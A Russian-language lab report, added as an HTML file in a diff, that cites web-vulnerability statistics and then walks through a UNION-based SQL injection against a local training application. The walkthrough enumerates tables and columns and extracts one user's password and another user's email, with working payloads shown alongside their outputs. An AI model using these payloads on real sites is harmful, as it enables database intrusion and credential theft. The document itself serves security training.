@@ -1,0 +1,103 @@
+<h2 id="-1">Часть 1</h2>
+<ol>
+<li><p>Ссылки на источники</p>
+</li>
+<li><p><a href="https://www.edgescan.com/wp-content/uploads/2025/04/2024-Vulnerability-Statistics-Report.pdf">Edgescan Vulnerability Statistics Report 2024</a></p>
+</li>
+<li><p><a href="https://info.edgescan.com/hubfs/23DOWNLOADABLE%20CONTENT/Vulnerability%20Statistics%20Reports/Edgescan_VulnerabilityStatsReport_2025.pdf">Edgescan Vulnerability Statistics Report 2025</a></p>
+</li>
+<li><p><a href="https://projects.webappsec.org/Web-Application-Security-Statistics">Web Application Security Statistics (WASC)</a></p>
+</li>
+<li><p><a href="https://www.aioncloud.com/2025-03-web-attack-trend-report/">AionCloud Web Attack Trend Report 2025</a></p>
+</li>
+<li><p>Доля успешных атак на организации, проведенных с помощью эксплуатации веб - уязвимостей</p>
+</li>
+</ol>
+<p>По данным AionCloud, примерно в 25–38% веб-атак используются уязвимости веб-приложений (в частности SQL-инъекции)</p>
+<ol>
+<li>Распределение по конкретным уязвимостям</li>
+</ol>
+<p>По данным отчётов Edgescan (2024–2025), среди критических уязвимостей веб-приложений доминируют:</p>
+<ul>
+<li>SQL-инъекции — около 19–28%</li>
+<li>XSS (stored) — около 10–10.5%</li>
+<li>загрузка вредоносных файлов — около 7%</li>
+<li>XSS (reflected) — около 5.5%</li>
+</ul>
+<p>Также встречаются:</p>
+<ul>
+<li>brute force (~4.2%)</li>
+<li>path traversal (~2.7%)</li>
+<li>CSRF (~2.1%)</li>
+</ul>
+<p>Согласно WASC, наиболее распространёнными уязвимостями в веб-приложениях в целом являются:</p>
+<ul>
+<li>Cross-Site Scripting (XSS)</li>
+<li>SQL Injection</li>
+<li>утечки информации (Information Leakage)</li>
+<li>ошибки конфигурации и защиты транспорта</li>
+</ul>
+<p>То есть XSS и SQLi стабильно входят в число самых распространённых проблем.</p>
+<p>Отчёт AionCloud (2025), основанный на анализе реальных атак, показывает, что:</p>
+<ul>
+<li>SQL-инъекции составляют около 25–30% атак</li>
+<li>также широко используются XSS и другие веб-уязвимости</li>
+</ul>
+<p>Различия в процентах объясняются различиями в методологии исследований (анализ уязвимостей vs анализ реальных атак)</p>
+<hr>
+<h2 id="-2">Часть 2</h2>
+<p>На странице написано &quot;Введите в качестве параметра ваш id&quot;<br>Пробую ввести просто рандомный айди, например, 3</p>
+<p><code>http://localhost:8080/task/?id=3</code></p>
+<p>Получаю</p>
+<p>Ваш id:3<br>Ваш логин:Matroskin</p>
+<p>Мне нужны пользователи Volk2 и Vinni-pukh<br>Пробую по порядку другие айди и нахожу этих пользователей</p>
+<p>Ваш id:4<br>Ваш логин:Vinni-pukh</p>
+<p>Ваш id:9<br>Ваш логин:Volk2</p>
+<p>Когда ввожу айди 10, страница пустая<br>Тогда у нас 9 пользователей</p>
+<p>Проверим, есть ли уязвимость<br>Ввожу <code>http://localhost:8080/task/?id=1&#39;</code></p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</p>
+<p>Получается уязвимость есть<br>Тогда надо узнать сколько колонок в таблице<br>Пробую через order by</p>
+<p><code>http://localhost:8080/task/?id=1 order by 1--</code></p>
+<p>Сработало</p>
+<p>Тогда пробую</p>
+<p><code>http://localhost:8080/task/?id=1 order by 2--</code></p>
+<p>Увеличиваю постепенно до 30<br>Но 30 колонок как-то слишком много, думаю, что-то не так<br>Попробую через union</p>
+<p><code>http://localhost:8080/task/?id=1&#39; UNION SELECT 1--</code></p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</p>
+<p>Получаю ошибку</p>
+<p><code>http://localhost:8080/task/?id=1&#39; UNION SELECT 1,2--</code></p>
+<p>Снова ошибка</p>
+<p><code>http://localhost:8080/task/?id=1&#39; UNION SELECT 1,2,3--</code></p>
+<p>Всё ещё ошибка, видимо, я что-то не так делаю<br>Может, надо убрать кавычку</p>
+<p><code>http://localhost:8080/task/?id=1 UNION SELECT 1,2,3--</code></p>
+<p>Вывелось просто</p>
+<p>Ваш id:1<br>Ваш логин:admin</p>
+<p>Ищу другие варианты</p>
+<p><code>http://localhost:8080/task/?id=1&#39; UNION SELECT 1,2,3#</code></p>
+<p>Ошибка</p>
+<p><code>http://localhost:8080/task/?id=1&#39; AND 1=2 UNION SELECT 1,2,3--</code></p>
+<p>И опять ошибка</p>
+<p><code>http://localhost:8080/task/?id=1&#39; AND 1=2 UNION SELECT 1,2,3%23</code></p>
+<p>Получаю</p>
+<p>Ваш id:1<br>Ваш логин:2</p>
+<p>Ура, тогда получается у нас три колонки<br>Тогда надо имя бд определить</p>
+<p><code>http://localhost:8080/task/?id=1&#39; AND 1=2 UNION SELECT 1,database(),3%23</code></p>
+<p>Ваш id:1<br>Ваш логин:security</p>
+<p>Бд называется security<br>Попробую через group contact узнать названия сразу всех таблиц</p>
+<p><code>http://localhost:8080/task/?id=1&#39; AND 1=2 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=&#39;security&#39;%23</code></p>
+<p>Ваш id:1<br>Ваш логин:emails,users</p>
+<p>Так, у нас две таблицы, emails и users<br>Логично, что почты в таблице emails, но интересно, какие колонки в таблице users</p>
+<p><code>http://localhost:8080/task/?id=1&#39; AND 1=2 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name=&#39;users&#39;%23</code></p>
+<p>Ваш id:1<br>Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
+<p>Супер, тогда пароли здесь<br>Можем узнать пароль нашего пользователя Volk2</p>
+<p><code>http://localhost:8080/task/?id=9&#39; AND 1=2 UNION SELECT 1,password,3 FROM users WHERE username=&#39;Volk2&#39;%23</code></p>
+<p>Ваш id:1<br>Ваш логин:Wa spoiuuuuu</p>
+<p>Ура, всё получилось, теперь второе задание<br>Нужно тоже узнать колонки в таблице emails</p>
+<p><code>http://localhost:8080/task/?id=1&#39; AND 1=2 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name=&#39;emails&#39;%23</code></p>
+<p>Ваш id:1<br>Ваш логин:id,email_id</p>
+<p>Странно, что колонка называется email_id</p>
+<p><code>http://localhost:8080/task/?id=4&#39; AND 1=2 UNION SELECT 1,email_id,3 FROM emails WHERE id=4%23</code></p>
+<p>Ваш id:1<br>Ваш логин:honey_lover@otus-lab.com</p>
+<p>А нет, там всё-таки почта, мы получили почту пользователя Vinni-pukh</p>
+<h3 id="-">Получаем:</h3>
+<p><strong>Пароль пользователя Volk2</strong> - Wa spoiuuuuu<br><strong>Почта пользователя Vinni-pukh</strong> - honey_lover@otus-lab.com</p>
